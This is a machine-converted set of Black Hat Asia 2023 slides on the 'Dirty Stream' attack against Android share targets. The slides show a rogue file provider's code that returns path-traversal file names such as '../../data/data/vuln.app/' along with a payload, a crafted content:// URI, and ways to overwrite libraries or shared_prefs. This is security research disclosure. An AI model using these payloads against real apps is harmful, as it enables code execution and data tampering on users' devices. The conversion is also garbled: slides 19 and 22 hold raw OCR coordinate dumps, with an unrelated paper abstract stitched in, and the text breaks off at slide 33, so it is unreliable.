---
title: "Dirty Stream Attack Turning Android"
speakers: ["Valsamaras"]
conference: "Black Hat"
conference_full: "Black Hat ASIA 2023"
edition: "ASIA"
year: 2023
source_pdf: "Black Hat Asia 2023 slides/AS-23-Valsamaras-Dirty-Stream-Attack-Turning-Android.pdf"
pages: 51
sha256: "61f36583bea402eae0065ea086beb09d35da3630aa5991251fb1d83520e75a2b"
text_chars: 30192
ocr_pages: 16
has_ocr: true
redacted_secrets: 0
ocr_confidence: 84.1
companion_files: []
extractor: "pymupdf4llm 1.28.2 + tesseract"
converted_at: "2026-08-12T01:38:29Z"
---
# Dirty Stream Attack Turning Android

**Speakers:** Valsamaras  
**Conference:** Black Hat ASIA 2023  
**Source:** `Black Hat Asia 2023 slides/AS-23-Valsamaras-Dirty-Stream-Attack-Turning-Android.pdf` (51 pages)


## Slide 1

# Dirty Stream Attack Turning Android Share Targets Into Attack Vectors

Dimitrios Valsamaras Microsoft Threat Intelligence

#BHASIA @BlackHatEvents

## Slide 2

**@Ch0pin​** <u>about://me</u>

**@Ch0pin​@infosec.exchange**

`o` Engaged in computer security since 2002 `o` Android security addict for the last 5 years `o` Senior security researcher @Microsoft

`o` Father of two

`o` Writing music, guitar, piano

#BHASIA @BlackHatEvents

## Slide 3

##### Did you say Android ?

#BHASIA @BlackHatEvents

## Slide 4

### <u>Outline</u>

Data and file sharing using content providers Share Targets Dirty stream attack Impact Defense

Blackhat Sound Bytes

#BHASIA @BlackHatEvents

## Slide 5

###### <u>Content providers</u>

A Content Provider conveys ways to securely share data with other Android applications A Content Resolver is a proxy object, used to communicate with the Content Provider A Cursor Loader is used to run an asynchronous query in the background not blocking the main thread

The result of a query can be retrieved via a Cursor Object

#BHASIA @BlackHatEvents

## Slide 6

###### <u>Content providers</u>

CursorLoader

Consumer

###### ContentInterface

ContentResolver : Query / Insert / Update / Delete

ContentProvider : Query / Insert / Update / Delete

Server

Structured File

#BHASIA @BlackHatEvents

## Slide 7

###### <u>Server</u>

**ActivityThread (Main Thread)**

▪ Authority
▪ Process Name
▪ Class name
▪ Package Name

**H.handleMessage BIND_APPLICATION handleBindApplication**

`o` **H.handleMessage**

**installContentProviders**

**installProvider** ContentProvider **attachInfo**

#BHASIA @BlackHatEvents

## Slide 8

Consumer
o getContentResolver

###### <u>Consumer</u>

`o` **ApplicationContentResolver**

**query**

- {"column_1","column_2",…,"column_N"}

**content://authority/table/filename**

`o` Cursor. get [String | Int | Long | Double | Float ](column index)

#BHASIA @BlackHatEvents

## Slide 9

###### <u>File providers</u>

Subclass of the ContentProvider

Share files by creating content Uris instead of file Specify shared directories in XML format, using child elements of the <paths>

**content** ://com.example.app/test_root

**file** ://

ParcelFileDescriptor

openFile

AssetFileDescriptor

openAssetFile

#BHASIA @BlackHatEvents

## Slide 10

###### <u>The file-paths file</u>

**content://com.example/test_root/data/data/com.example/**

file:///storage/emulated/0

#BHASIA @BlackHatEvents

## Slide 11

###### <u>File providers (consumer)</u>

`o` **openInputStream**

**content://**

`o` **openAssetFileDescriptor**

**cache**

**External or Internal directory**

#BHASIA @BlackHatEvents

## Slide 12

###### <u>Content providers Security</u>

content://com.android.contacts

content://com.android.calendar

#BHASIA @BlackHatEvents

> Text below was recovered by OCR (confidence 84/100) from an image-only slide. Wording is approximate; verify exact values against the source PDF.

```text
blackhat Content providers Security
/** See {@code Manifest#READ_CONTACTS} */
public static final String READ_CONTACTS = J"android.permission.READ_CONTACTS";] egntent://com.android.contacts
/** See {@code Manifest#WRITE_CONTACTS} */
public static final String WRITE_CONTACTS = “android.permission.WRITE_CONTACTS" ;
/** See {@code Manifest#SET DEFAULT _ACCOUNT_FOR CONTACTS} */
public static final String SET_DEFAULT_ACCOUNT_FOR_CONTACTS =
/** See {@code Manifest#READ_ CALENDAR} */
public static final String READ_CALENDAR = |"android.permission.READ_ CALENDAR"; content://com.android.calendar
/** See {@code Manifest#WRITE_CALENDAR} */
public static final String WRITE_CALENDAR = “android.permission.WRITE_CALENDAR" ;
/** See {@code Manifest#ACCESS MESSAGES ON ICC} */
public static final String ACCESS MESSAGES ON_ICC = “android.permission"™
/** See {@code Manifest#SEND_SMS} */
public static final String SEND_SMS = “android.permission.SEND_SMS;
/** See {@code Manifest#RECEIVE_SMS} */
public static final String RECEIVE_SMS = “android.permission.RECEIVE_SMS";
#BHASIA @BlackHatEvents
```

## Slide 13

###### <u>Content providers Security</u>

**FLAG_GRANT_[READ|WRITE]_URI_PERMISSION**

#BHASIA @BlackHatEvents

> Text below was recovered by OCR (confidence 90/100) from an image-only slide. Wording is approximate; verify exact values against the source PDF.

```text
ASIA 2023
Content providers Security 2
<provider android
android
android
android
:exported=["true" | false]
android
android
android
android
android
android
android
android
android
android
</provider>
android:
:multiprocess=["true" | false]
:permission=" string"
:process="string"
:syncable=["true" | false]
:writePermission="string" >
label="string resource"
GRANT_[READ|WRITE
#BHASIA @BlackHatEvents
```

## Slide 14

###### <u>Content providers Security ?</u>

###### Class: android.content.Context

_Grant permission to access a specific Uri to another package, regardless of whether that package has general permission to access the Uri's content provider._

Notice anything strange ?

#BHASIA @BlackHatEvents

## Slide 15

###### <u>Share Targets</u>

A share target is an Android application that can receive data or files from other apps **Examples: file/image/video processing, mail clients, messengers, social network, browsers ...** To create a share target:

`o` **Use an Activity with a matching intent filter OR** `o` **Use the ChooserTargetService OR** `o` **Use the Sharing shortcuts API**

#BHASIA @BlackHatEvents

## Slide 16

###### <u>Share Targets</u>

#BHASIA @BlackHatEvents

> Text below was recovered by OCR (confidence 83/100) from an image-only slide. Wording is approximate; verify exact values against the source PDF.

```text
A
blackhat Share Targets
<activity android:name#" .ui.MyActivity"| >
1 ‘STREAM HANDLER: <intent-filter>
<category android:name="android.intent.category.DEFAULT" />
<data android:mimeType="image/*" />
<action android:name="android.intent.action.SEND" />
<data android:mimeType="text/plain" />
3 ‘DATA TYPE <intent-filter>
<action android:name="android.intent.action.SEND_MULTIPLE" />
<data android:mimeType="image/*" />
</intent-filter>
</activity>
#BHASIA @BlackHatEvents
```

## Slide 17

###### <u>Sending a file</u>

Create an intent of action ACTION_SEND or ACTION_SEND_MULTIPLE Attach a file as an EXTRA_STREAM extra Define the data type

Create a new intent using the Intent.createChooser Use the startActivity to start the share-sheet dialog

#BHASIA @BlackHatEvents

## Slide 18

###### <u>Sending a file</u>

3
4
5

1 2

#BHASIA @BlackHatEvents

> Text below was recovered by OCR (confidence 78/100) from an image-only slide. Wording is approximate; verify exact values against the source PDF.

```text
A
black hat Sending a file
X_ Share with
sendiIntent.setType("image/jpeg"); 3
Intent shareSheet = Intent.createChooser(sendIntent, title: null); 4
startActivity(shareSheet); 5
#BHASIA @BlackHatEvents
```

## Slide 19

###### <u>Handling a stream</u>

#BHASIA @BlackHatEvents

> Text below was recovered by OCR (confidence 86/100) from an image-only slide. Wording is approximate; verify exact values against the source PDF.

```text
blackhat Handling a stream ee 3
public static final java.lang.String getFi imeCandroid.content.Context context, android.net.Uri uri) {
java.lang.String filename = ;
android.database.Cursor query = context.getContentResolver().query(uri, new java.lang.String[]{"_c ay_name"},
selection: nulL, selectionArgs: nuL1L, sortOrder: null, cancellationSignal: null);
if (query != null) {
try {
if (query.moveToFirst()) {
filename = query.getString(query.getColumnIndex( columnName: 5	1	7	1	6	6	1562	770	3	2	27.614067	p
5	1	7	1	6	7	1636	763	115	26	90.141869	name));
}
} catch (Exception e){
e.printStackTrace();
if (filename != null) {
return filename;
}
throw new java.lang.IllLegalArgumentException("Could not get filename from 5	1	9	1	4	9	1544	1207	12	13	96.887688	+
5	1	9	1	4	10	1575	1201	70	25	96.618324	uri);
2	1	10	0	0	0	254	312	1880	1032	-1	
3	1	10	1	0	0	254	312	1880	1032	-1	
4	1	10	1	1	0	254	312	1880	1032	-1	
5	1	10	1	1	1	254	312	1880	1032	95.000000	 
2	1	11	0	0	0	2241	1450	354	19	-1	
3	1	11	1	0	0	2241	1450	354	19	-1	
4	1	11	1	1	0	2241	1450	354	19	-1	
5	1	11	1	1	1	2241	1450	112	17	89.211395	#BHASIA
5	1	11	1	1	2	2377	1450	218	19	88.257797	@BlackHatEvents
```

## Slide 20

###### <u>Handling a stream</u>

#BHASIA @BlackHatEvents

> Text below was recovered by OCR (confidence 85/100) from an image-only slide. Wording is approximate; verify exact values against the source PDF.

```text
blackhat Handling a stream ee 3
public woid c ile(Uri uri, String filename) {
InputStream inputStream = null;
File cache = new File(getFilesDir(), filename);
try {
inputStream = getApplicationContext().getContentResolver().openInputStream(uri);
java.io.FileQutputStream fileQutputStream = new java.io.FileQutputStream(cache);
} catch (FileNotFoundException e) {
#BHASIA @BlackHatEvents
```

## Slide 21

###### <u>Handling a stream</u>

**Both values are controlled by the sender !**

#BHASIA @BlackHatEvents

> Text below was recovered by OCR (confidence 84/100) from an image-only slide. Wording is approximate; verify exact values against the source PDF.

```text
blackhat Handling a stream ee 3
Both values are controlled by
the sender !
public void c
InputStream inputStream = nu
File cache = new File(getFilesDir(), filename);
try {
inputStream = getAppLicationContext().getContentResolver().openInputStream(uri);
java.io.FileQutputStream fileOutputStream = new java.io.FileQutputStream(cache) ;
copyTo(inputStream, fileQutputStream);
} catch (FileNotFoundException e) {
e.printStackTrace();
#BHASIA @BlackHatEvents
```

## Slide 22

###### <u>Handling a stream</u>

#BHASIA @BlackHatEvents

> Text below was recovered by OCR (confidence 84/100) from an image-only slide. Wording is approximate; verify exact values against the source PDF.

```text
ASIA 20e3
blic static final java.lang.String getFilename(android.content.Context context, android.net.Uri uri) {
is an Activity): android.database.Cursor query = context.getContentResolver().query(uri, new java.lang.String[]{"_display_name"},
selection: null, selectionArgs: null, so ler: null, ca tionSignal: nuLL) ;
public String getFileName(Uri uri) {
String result = null;
if (uri.getScheme().equals("content")) {
Cursor cursor = getContentResolver().query(uri, null, nu nu NULL); try {
try { if (query.moveToFirst()) {
if (cursor != null && cursor.moveToFirst()) { . . . ,
} }
} finally { } catch (Exception e){
, cursor.close(); e.printStackTrace();
}
if (result == null) {
result = uri.getPath();
int ct result. lastIndex0f('/');
if (cut != -1) { if (filename != null) {
result = result.substring(cut + 1); return filename;
}
return result; throw new java. lang. IllLegalArgumentException("Co not get filename from 5	1	8	1	4	13	2154	919	9	9	96.855934	+
5	1	8	1	4	14	2178	914	53	19	96.000839	uri);
2	1	9	0	0	0	1256	481	232	20	-1	
3	1	9	1	0	0	1256	481	232	20	-1	
4	1	9	1	1	0	1256	481	232	20	-1	
5	1	9	1	1	1	1256	482	20	15	95.377289	if
5	1	9	1	1	2	1292	481	67	20	93.240822	(query
5	1	9	1	1	3	1377	483	17	14	90.266861	!=
5	1	9	1	1	4	1409	481	54	18	90.864975	null)
5	1	9	1	1	5	1480	481	8	18	90.864975	{
2	1	10	0	0	0	198	945	7	16	-1	
3	1	10	1	0	0	198	945	7	16	-1	
4	1	10	1	1	0	198	945	7	16	-1	
5	1	10	1	1	1	198	945	7	16	92.475494	}
2	1	11	0	0	0	1201	241	4	777	-1	
3	1	11	1	0	0	1201	241	4	777	-1	
4	1	11	1	1	0	1201	241	4	777	-1	
5	1	11	1	1	1	1201	241	4	777	95.000000	 
2	1	12	0	0	0	81	1049	1343	34	-1	
3	1	12	1	0	0	81	1049	1343	34	-1	
4	1	12	1	1	0	81	1049	1343	34	-1	
5	1	12	1	1	1	81	1051	45	25	95.439789	An
5	1	12	1	1	2	142	1050	158	33	95.439789	Empirical
5	1	12	1	1	3	316	1050	96	33	96.462173	Study
5	1	12	1	1	4	425	1049	35	27	96.010902	of
5	1	12	1	1	5	472	1051	74	26	94.579506	C++
5	1	12	1	1	6	561	1050	253	26	95.948662	Vulnerabilities
5	1	12	1	1	7	830	1050	29	26	89.800476	in
5	1	12	1	1	8	874	1050	271	27	88.463066	Crowd-Sourced
5	1	12	1	1	9	1161	1050	85	27	95.836113	Code
5	1	12	1	1	10	1262	1050	162	33	95.836113	Examples
2	1	13	0	0	0	83	1109	1097	23	-1	
3	1	13	1	0	0	83	1109	1097	23	-1	
4	1	13	1	1	0	83	1109	1097	23	-1	
5	1	13	1	1	1	83	1110	89	18	92.843323	Morteza
5	1	13	1	1	2	182	1109	63	21	93.303291	Verdi,
5	1	13	1	1	3	255	1109	81	19	92.589752	Ashkan
5	1	13	1	1	4	347	1105	58	31	96.444679	Sami,
5	1	13	1	1	5	414	1109	51	22	93.278938	Jafar
5	1	13	1	1	6	474	1109	119	21	85.065140	Akhondali,
5	1	13	1	1	7	604	1110	72	18	92.288063	Foutse
5	1	13	1	1	8	687	1109	84	22	91.686638	Khomh,
5	1	13	1	1	9	781	1110	45	18	92.598770	Gias
5	1	13	1	1	10	838	1109	70	21	96.198128	Uddin,
5	1	13	1	1	11	918	1109	77	19	93.234337	Alireza
5	1	13	1	1	12	1005	1110	76	18	92.419243	Karami
5	1	13	1	1	13	1092	1109	88	23	92.122849	Motlagh
2	1	14	0	0	0	111	1165	2225	174	-1	
3	1	14	1	0	0	111	1165	2225	174	-1	
4	1	14	1	1	0	111	1165	2225	20	-1	
5	1	14	1	1	1	111	1165	81	16	96.865669	Software
5	1	14	1	1	2	201	1165	102	19	96.694550	developers
5	1	14	1	1	3	312	1165	50	16	96.845543	share
5	1	14	1	1	4	372	1170	128	15	95.937431	programming
5	1	14	1	1	5	510	1165	85	16	96.479874	solutions
5	1	14	1	1	6	605	1166	15	15	96.452950	in
5	1	14	1	1	7	629	1166	41	17	96.200363	Q&A
5	1	14	1	1	8	679	1166	41	15	96.411201	sites
5	1	14	1	1	9	730	1165	30	16	96.776146	like
5	1	14	1	1	10	770	1165	49	16	96.620575	Stack
5	1	14	1	1	11	827	1165	89	16	96.561066	Overflow.
5	1	14	1	1	12	924	1165	34	16	96.797951	The
5	1	14	1	1	13	968	1170	50	11	96.797951	reuse
5	1	14	1	1	14	1026	1165	19	16	93.299820	of
5	1	14	1	1	15	1052	1165	144	16	88.733536	crowd-sourced
5	1	14	1	1	16	1205	1165	44	16	96.238228	code
5	1	14	1	1	17	1258	1166	79	18	96.474533	snippets
5	1	14	1	1	18	1346	1170	31	11	96.798462	can
5	1	14	1	1	19	1386	1165	80	16	96.798462	facilitate
5	1	14	1	1	20	1476	1165	46	19	96.526871	rapid
5	1	14	1	1	21	1532	1166	116	19	96.500923	prototyping.
5	1	14	1	1	22	1658	1166	85	17	96.561569	However,
5	1	14	1	1	23	1754	1168	57	13	96.653488	recent
5	1	14	1	1	24	1820	1165	79	16	96.680305	research
5	1	14	1	1	25	1908	1165	57	16	96.653374	shows
5	1	14	1	1	26	1974	1165	37	16	96.653374	that
5	1	14	1	1	27	2019	1165	28	16	96.517967	the
5	1	14	1	1	28	2056	1165	63	16	96.593643	shared
5	1	14	1	1	29	2128	1165	44	16	96.593643	code
5	1	14	1	1	30	2181	1166	79	18	96.351120	snippets
5	1	14	1	1	31	2269	1170	38	14	96.652573	may
5	1	14	1	1	32	2316	1165	20	16	97.004951	be
4	1	14	1	2	0	111	1195	2101	20	-1	
5	1	14	1	2	1	111	1195	18	16	96.682510	of
5	1	14	1	2	2	138	1196	31	15	96.300217	low
5	1	14	1	2	3	177	1196	63	19	96.910942	quality
5	1	14	1	2	4	248	1196	33	15	96.647263	and
5	1	14	1	2	5	290	1201	31	10	96.841011	can
5	1	14	1	2	6	331	1201	41	10	96.678665	even
5	1	14	1	2	7	381	1197	69	14	96.693199	contain
5	1	14	1	2	8	459	1196	139	15	96.460312	vulnerabilities.
5	1	14	1	2	9	606	1196	39	15	96.995789	This
5	1	14	1	2	10	655	1201	53	14	96.466362	paper
5	1	14	1	2	11	716	1197	43	14	96.890846	aims
5	1	14	1	2	12	767	1198	18	13	96.717186	to
5	1	14	1	2	13	794	1196	107	15	96.773834	understand
5	1	14	1	2	14	910	1196	28	15	96.419731	the
5	1	14	1	2	15	948	1199	58	12	96.606949	nature
5	1	14	1	2	16	1016	1196	33	15	95.324341	and
5	1	14	1	2	17	1058	1196	28	15	95.324341	the
5	1	14	1	2	18	1096	1196	100	19	96.466415	prevalence
5	1	14	1	2	19	1205	1196	18	15	96.979889	of
5	1	14	1	2	20	1232	1199	73	16	97.002678	security
5	1	14	1	2	21	1312	1196	133	15	96.898918	vulnerabilities
5	1	14	1	2	22	1455	1197	15	14	92.991043	in
5	1	14	1	2	23	1479	1196	144	15	86.779160	crowd-sourced
5	1	14	1	2	24	1632	1196	43	15	96.693283	code
5	1	14	1	2	25	1684	1196	96	19	96.283363	examples.
5	1	14	1	2	26	1788	1197	24	14	96.283363	To
5	1	14	1	2	27	1820	1196	69	15	96.418388	achieve
5	1	14	1	2	28	1898	1196	34	15	97.017120	this
5	1	14	1	2	29	1940	1196	45	19	97.013351	goal,
5	1	14	1	2	30	1993	1201	25	10	97.012772	we
5	1	14	1	2	31	2028	1198	101	17	96.860039	investigate
5	1	14	1	2	32	2139	1197	73	18	96.328644	security
4	1	14	1	3	0	111	1226	2218	20	-1	
5	1	14	1	3	1	111	1227	133	15	96.333160	vulnerabilities
5	1	14	1	3	2	254	1231	14	11	96.333160	in
5	1	14	1	3	3	277	1227	29	15	96.455009	the
5	1	14	1	3	4	314	1227	41	15	91.915726	C++
5	1	14	1	3	5	366	1227	44	15	91.915726	code
5	1	14	1	3	6	419	1229	79	17	96.542183	snippets
5	1	14	1	3	7	507	1227	62	15	96.224602	shared
5	1	14	1	3	8	578	1231	22	11	96.889351	on
5	1	14	1	3	9	609	1227	49	15	96.947899	Stack
5	1	14	1	3	10	666	1226	84	16	96.949257	Overflow
5	1	14	1	3	11	758	1231	40	11	96.189926	over
5	1	14	1	3	12	806	1232	10	10	96.189926	a
5	1	14	1	3	13	825	1227	58	19	95.966568	period
5	1	14	1	3	14	892	1226	19	16	97.007240	of
5	1	14	1	3	15	920	1227	21	15	97.007240	10
5	1	14	1	3	16	949	1231	55	15	96.934921	years.
5	1	14	1	3	17	1014	1228	14	14	96.532791	In
5	1	14	1	3	18	1037	1227	121	15	96.791794	collaborative
5	1	14	1	3	19	1168	1227	78	15	96.411812	sessions
5	1	14	1	3	20	1256	1227	84	19	96.796082	involving
5	1	14	1	3	21	1350	1227	76	19	96.543640	multiple
5	1	14	1	3	22	1435	1227	63	15	96.628143	human
5	1	14	1	3	23	1508	1227	68	18	96.670898	coders,
5	1	14	1	3	24	1584	1231	24	11	96.475510	we
5	1	14	1	3	25	1618	1227	85	19	96.806084	manually
5	1	14	1	3	26	1711	1227	83	15	96.154503	assessed
5	1	14	1	3	27	1804	1227	41	15	96.470177	each
5	1	14	1	3	28	1854	1227	44	15	96.714630	code
5	1	14	1	3	29	1907	1229	70	17	96.493629	snippet
5	1	14	1	3	30	1985	1226	26	16	96.576065	for
5	1	14	1	3	31	2020	1229	73	17	96.513618	security
5	1	14	1	3	32	2100	1227	133	15	96.787659	vulnerabilities
5	1	14	1	3	33	2242	1226	87	20	96.511108	following
4	1	14	1	4	0	111	1257	2188	20	-1	
5	1	14	1	4	1	111	1258	40	15	96.386177	CWE
5	1	14	1	4	2	159	1258	92	16	96.543114	(Common
5	1	14	1	4	3	259	1258	93	15	95.210831	Weakness
5	1	14	1	4	4	361	1258	126	16	96.403961	Enumeration)
5	1	14	1	4	5	495	1257	103	20	96.080711	guidelines.
5	1	14	1	4	6	608	1258	46	15	95.590385	From
5	1	14	1	4	7	663	1258	28	15	95.590385	the
5	1	14	1	4	8	702	1258	64	18	96.196800	72,483
5	1	14	1	4	9	777	1257	81	16	96.510757	reviewed
5	1	14	1	4	10	868	1257	43	16	95.802094	code
5	1	14	1	4	11	921	1260	78	17	95.802094	snippets
5	1	14	1	4	12	1009	1258	43	15	96.910995	used
5	1	14	1	4	13	1062	1262	14	11	96.455437	in
5	1	14	1	4	14	1085	1260	17	13	96.455437	at
5	1	14	1	4	15	1110	1258	43	15	96.501801	least
5	1	14	1	4	16	1162	1262	33	11	96.253410	one
5	1	14	1	4	17	1204	1260	66	17	96.859932	project
5	1	14	1	4	18	1279	1257	61	16	96.686195	hosted
5	1	14	1	4	19	1350	1262	22	11	96.892387	on
5	1	14	1	4	20	1381	1258	70	18	96.588631	GitHub,
5	1	14	1	4	21	1460	1262	24	11	96.588631	we
5	1	14	1	4	22	1493	1257	54	16	96.724876	found
5	1	14	1	4	23	1549	1253	11	29	96.801559	a
5	1	14	1	4	24	1573	1258	41	15	96.491440	total
5	1	14	1	4	25	1624	1257	18	16	96.969254	of
5	1	14	1	4	26	1650	1258	23	15	96.712799	69
5	1	14	1	4	27	1681	1257	98	16	96.652664	vulnerable
5	1	14	1	4	28	1788	1258	43	15	96.703484	code
5	1	14	1	4	29	1841	1260	79	17	96.776886	snippets
5	1	14	1	4	30	1928	1258	111	19	96.334717	categorized
5	1	14	1	4	31	2049	1258	35	15	96.991508	into
5	1	14	1	4	32	2093	1258	22	15	97.015785	29
5	1	14	1	4	33	2124	1260	55	17	96.419395	types.
5	1	14	1	4	34	2189	1258	49	19	96.739670	Many
5	1	14	1	4	35	2245	1257	19	16	96.854439	of
5	1	14	1	4	36	2271	1258	28	15	96.787842	the
4	1	14	1	5	0	112	1288	2216	20	-1	
5	1	14	1	5	1	112	1289	114	19	96.665527	investigated
5	1	14	1	5	2	235	1289	43	15	96.335754	code
5	1	14	1	5	3	288	1291	78	17	96.776604	snippets
5	1	14	1	5	4	375	1293	28	11	96.990608	are
5	1	14	1	5	5	413	1288	31	16	96.931519	still
5	1	14	1	5	6	454	1291	29	13	96.976273	not
5	1	14	1	5	7	492	1289	88	15	96.688934	corrected
5	1	14	1	5	8	589	1293	22	11	96.299789	on
5	1	14	1	5	9	620	1288	49	16	96.835930	Stack
5	1	14	1	5	10	677	1288	89	16	96.520126	Overflow.
5	1	14	1	5	11	775	1288	34	16	96.702690	The
5	1	14	1	5	12	818	1289	23	15	96.998764	69
5	1	14	1	5	13	848	1288	99	16	96.638618	vulnerable
5	1	14	1	5	14	955	1288	44	16	96.728470	code
5	1	14	1	5	15	1009	1289	79	19	96.735657	snippets
5	1	14	1	5	16	1096	1288	55	16	96.790276	found
5	1	14	1	5	17	1160	1289	15	15	96.754440	in
5	1	14	1	5	18	1184	1288	49	16	96.915527	Stack
5	1	14	1	5	19	1241	1288	85	16	96.486633	Overflow
5	1	14	1	5	20	1332	1293	45	11	96.974075	were
5	1	14	1	5	21	1385	1288	63	16	96.099625	reused
5	1	14	1	5	22	1457	1289	15	15	96.410217	in
5	1	14	1	5	23	1477	1284	8	28	96.410217	a
5	1	14	1	5	24	1498	1288	42	16	96.538727	total
5	1	14	1	5	25	1548	1288	19	16	96.657249	of
5	1	14	1	5	26	1575	1289	48	15	96.657249	2859
5	1	14	1	5	27	1631	1288	65	16	96.644882	GitHub
5	1	14	1	5	28	1705	1289	81	19	96.564095	projects.
5	1	14	1	5	29	1794	1289	24	15	96.682861	To
5	1	14	1	5	30	1827	1288	39	20	95.829750	help
5	1	14	1	5	31	1875	1293	75	15	95.829750	improve
5	1	14	1	5	32	1959	1289	29	15	96.921005	the
5	1	14	1	5	33	1996	1289	64	18	97.000580	quality
5	1	14	1	5	34	2068	1288	19	16	97.012360	of
5	1	14	1	5	35	2094	1289	43	15	96.434860	code
5	1	14	1	5	36	2147	1289	79	19	96.805664	snippets
5	1	14	1	5	37	2235	1288	62	16	96.222824	shared
5	1	14	1	5	38	2306	1293	22	11	96.946106	on
4	1	14	1	6	0	111	1319	1621	20	-1	
5	1	14	1	6	1	111	1320	49	15	96.440369	Stack
5	1	14	1	6	2	169	1319	88	18	96.284256	Overflow,
5	1	14	1	6	3	266	1324	24	11	96.883820	we
5	1	14	1	6	4	299	1319	97	19	96.306015	developed
5	1	14	1	6	5	405	1324	9	11	96.936523	a
5	1	14	1	6	6	423	1320	75	15	96.850929	browser
5	1	14	1	6	7	506	1320	92	15	96.669395	extension
5	1	14	1	6	8	607	1319	36	16	96.981171	that
5	1	14	1	6	9	652	1319	48	16	96.825783	allow
5	1	14	1	6	10	708	1319	49	16	96.875977	Stack
5	1	14	1	6	11	765	1319	85	16	96.965759	Overflow
5	1	14	1	6	12	858	1324	49	11	96.550919	users
5	1	14	1	6	13	915	1322	18	13	96.550919	to
5	1	14	1	6	14	941	1319	53	16	96.867668	check
5	1	14	1	6	15	1003	1319	26	16	96.216644	for
5	1	14	1	6	16	1037	1319	133	16	96.440216	vulnerabilities
5	1	14	1	6	17	1179	1324	15	11	96.985298	in
5	1	14	1	6	18	1203	1320	43	15	96.880753	code
5	1	14	1	6	19	1256	1322	79	16	96.229851	snippets
5	1	14	1	6	20	1343	1319	49	16	96.727898	when
5	1	14	1	6	21	1401	1320	40	19	96.164398	they
5	1	14	1	6	22	1450	1319	62	19	96.128647	upload
5	1	14	1	6	23	1522	1320	46	15	96.191658	them
5	1	14	1	6	24	1577	1324	22	11	95.325668	on
5	1	14	1	6	25	1608	1319	29	16	96.866661	the
5	1	14	1	6	26	1646	1319	86	19	96.262199	platform.
2	1	15	0	0	0	2241	1450	354	19	-1	
3	1	15	1	0	0	2241	1450	354	19	-1	
4	1	15	1	1	0	2241	1450	354	19	-1	
5	1	15	1	1	1	2241	1450	112	17	88.671844	#BHASIA
5	1	15	1	1	2	2377	1451	218	18	88.671844	@BlackHatEvents
2	1	16	0	0	0	0	0	2667	1500	-1	
3	1	16	1	0	0	0	0	2667	1500	-1	
4	1	16	1	1	0	0	0	2667	1500	-1	
5	1	16	1	1	1	0	0	2667	1500	95.000000
```

## Slide 23

###### <u>Adversary Model</u>

`o` User has installed a rogue app

`o` No permissions needed

(INTERNET: only in case we want to download a payload remotely )

#BHASIA @BlackHatEvents

## Slide 24

###### <u>Dirty Stream Attack</u>

###### Request to process file

What is the name of the file?

Name = ../../data/data/vuln.app/ [so | dex | js | xml | *]

openInputStream(Uri)

Content =

#BHASIA @BlackHatEvents

## Slide 25

###### <u>Dirty Stream Attack</u>

Create a customized file provider to share a payload Modify the query method to return a mal-crafted file name

Modify the openFile to return a file to descriptor to our payload

###### Minimize user interaction

#BHASIA @BlackHatEvents

## Slide 26

###### <u>Customizing the file provider</u>

#BHASIA @BlackHatEvents

> Text below was recovered by OCR (confidence 81/100) from an image-only slide. Wording is approximate; verify exact values against the source PDF.

```text
blackhat Customizing the file provider
Public boolean onCreate() { return false; }
public android.database.Cursor] query(android.net.Uri uri, java.lang.String[] projection, java.lang.String selection,
java.lang.String[] selectionArgs, java.lang.String sort0rder)
public ParcelFileDescriptor jopenFile(Uri uri, String mode) throws FileNotFoundException {...}
public ParceLFileDescriptor jopenFile(Uri uri, String mode, CancellationSignal cancellationSignal)
throws FileNotFoundexception 1...)
public String getType(@NomNuLL Uri uri) { return null; }
public Uri insert(@NonNull Uri uri, @NuLLable ContentVaLlues contentValues) { return null; }
public int delete(@NonNuLL Uri uri, @NulLable String s, @NuLLable String[] strings) {...}
public int update(@NonNull Uri uri, @NuLLable ContentValues contentValues, @NuLLable String s,
@Nullable String[] strings) {...}
#BHASIA @BlackHatEvents
```

## Slide 27

###### <u>Customizing the file provider</u>

#BHASIA @BlackHatEvents

> Text below was recovered by OCR (confidence 86/100) from an image-only slide. Wording is approximate; verify exact values against the source PDF.

```text
blackhat Customizing the file provider
@0verride
public android.database.Cursor queryfandroid.net.Uri uri, java.lang.String[] projection,
java.lang.String selection, java.lang.String[] selectionArgs,
java.lang.String sortOrder) {
Log.d( tag: Incoming
5	1	8	1	1	4	609	502	324	24	91.020363	Query:,uri.toString());
android.database.MatrixCursor matrixCursor = new android.database.MatrixCursor
(new java.lang.String[]{"_display_name", _size,"_data","title"});
boolean doEncode = uri.getBooleanQueryParameter( key: enc, defaultValue: false) ;
if(doEncode) {...}
else {
displayName= uri.getQueryParameter( key: name);
}
matrixCursor.addRow(new java.lang.Object[]{ null, uri.getQueryParameter( key: _size),null, null});
else
matrixCursor.addRow(new java.lang.Object[]{ displayName, uri.getQueryParameter( key: _size),displayName, displayName})
try dies
catch (Exception e){
e.printStackTrace();
}
#BHASIA @BlackHatEvents
```

## Slide 28

###### <u>Customizing the file provider</u>

Get the incoming Uri Obtain the path query parameter Return a file descriptor the path obtained from the previous step

#BHASIA @BlackHatEvents

## Slide 29

###### <u>Carrying the payload</u>

#BHASIA @BlackHatEvents

> Text below was recovered by OCR (confidence 87/100) from an image-only slide. Wording is approximate; verify exact values against the source PDF.

```text
A
black hat Carrying the payload
i app-debug.apk private void writeToFilesFolderFromAssets(String filename) {
B libpayload.so try {
> Meres InputStream is = getAssets().open(filename);
BE res (generated) File filesDir = getFilesDir();
> @ Gradle Scripts File file = new File(filesDir, filename);
OutputStream os = Files.newOutputStream(Paths.get(file.getAbsolutePath()));
byte[] buff = new byte[1024];
int len;
while ((len = is.read(buff)) > 0) {
os.write(buff, off: GO, Len);
}
os.flush();
os.close();
is.close();
} catch (I0Exception e) {
e.printStackTrace();
#BHASIA @BlackHatEvents
```

## Slide 30

###### <u>Minimizing user interaction</u>

###### Target package name and component

content://com.exploit/dummy.ext?path=/data/data/com.exploit/files/payload &name=../../target_file_name.ext &size=X &enc=[ True | False ]

|_display_name
../../target_file_name.ext|_size
X|_data
../../target_file_name.ext|title
../../target_file_name.ext|
|---|---|---|---|

#BHASIA @BlackHatEvents

## Slide 31

###### <u>Exploiting Write Access</u>

`o` Loading libraries from the data directory

`o` Critical settings in the shared_prefs directory

`o` Using on-demand delivery modules

`o` Loads code dynamically (DCL)

#BHASIA @BlackHatEvents

## Slide 32

## if (file.exists())

## abort()

#BHASIA @BlackHatEvents

> Text below was recovered by OCR (confidence 82/100) from an image-only slide. Wording is approximate; verify exact values against the source PDF.

```text
ASIA 2023
By Passing '
if (file.exists()) = abort()
#BHASIA @BlackHatEvents
```

## Slide 33

###### <u>The .bak file</u>

/data/data/com.example.app/shared_prefs/example.xml

